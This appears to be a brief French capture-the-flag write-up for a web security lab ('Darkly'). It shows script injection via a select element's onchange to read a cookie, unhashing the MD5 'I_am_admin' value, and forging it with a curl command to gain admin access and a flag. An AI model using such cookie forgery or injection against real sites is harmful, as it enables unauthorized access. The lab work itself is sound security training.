/index.php?page=survey
Insérer le script "alert(document.cookie);" dans le onchange d'un des <select>
Ca affiche "I_am_admin=68934a3e9455fa72420237eb05902327"
Si on unhash (MD5) "68934a3e9455fa72420237eb05902327" ça on obtient "false"
On hash (MD5) "true" qui donne "b326b5062b2f0e69046810717534cb09"
On utilise curl avec la commande : curl --cookie "I_am_admin=b326b5062b2f0e69046810717534cb09" <IP_DARKLY>
On obtient le flag : df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3
